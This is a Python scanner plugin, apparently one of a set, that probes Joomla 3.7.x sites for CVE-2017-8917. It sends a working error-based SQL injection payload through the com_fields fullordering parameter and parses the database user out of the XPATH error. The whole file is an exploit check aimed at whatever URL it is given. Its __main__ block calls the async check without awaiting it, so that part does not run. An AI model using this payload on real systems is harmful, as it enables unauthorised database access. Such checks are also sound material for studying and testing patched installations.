#!/usr/bin/python3

import re
from app.lib.common import get_useragent
from app.lib.request import request

class CVE_2017_8917_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'CVE-2017-8917 SQL注入漏洞',
            'description': 'CVE-2017-8917 SQL注入漏洞, 影响范围为: Joomla 3.7.x-3.7.1',
            'date': '2017-05-12',
            'exptype': 'check',
            'type': 'SQL Injection'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.headers = {
            'User-Agent': get_useragent()
        }
        self.payload = '/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,user()),1)'

    async def check(self):
    
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """
        
        try:
            check_req = await request.get(self.url + self.payload, headers = self.headers)
            if 'XPATH syntax error:' in await check_req.text():
                pattern = re.compile('<span class="label label-inverse">500</span>(.*?)</blockquote>')
                cmd_result = pattern.findall(await check_req.text())[0]
                return True
            
        except Exception as e:
            # print(e)
            pass

if __name__ == '__main__':
    CVE_2017_8917 = CVE_2017_8917_BaseVerify('http://127.0.0.1:8080')
    CVE_2017_8917.check()